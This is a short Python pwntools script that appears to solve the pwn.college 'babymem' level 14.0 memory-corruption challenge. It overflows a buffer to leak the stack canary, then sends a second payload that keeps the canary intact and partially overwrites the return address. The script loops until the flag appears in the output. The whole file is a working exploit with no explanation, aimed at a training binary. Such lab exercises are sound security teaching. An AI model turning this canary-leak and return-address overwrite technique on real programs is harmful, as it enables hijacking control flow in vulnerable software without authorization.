from pwn import *

while True:
    p = process("/challenge/babymem_level14.0")
    p.sendline(b"500")
    ret_addr = 0x198D
    s=b"REPEATAA" + b"A"*(0x90) + b"A"
    p.send(s)
    while True:
        cont = p.recvline()
        if cont.find(b"REPEATAA")!=-1:
            break
    start = cont.find(b"REPEATAA")
    cookie = bytearray(cont[start + 0x98: start + 0xa0])
    cookie[0] = b'\x00'[0]
    icookie = int.from_bytes(cookie, "little")
    print(icookie)

    s = b"A"*0x1A8 + cookie + b"A"*0x8 + ret_addr.to_bytes(2,"little")
    p.sendline(b"500")
    p.send(s)
    all = p.recvall()
    print(all.decode(errors="ignore"))
    p.close()
    if all.find(b"pwn.college{") != -1:
        break
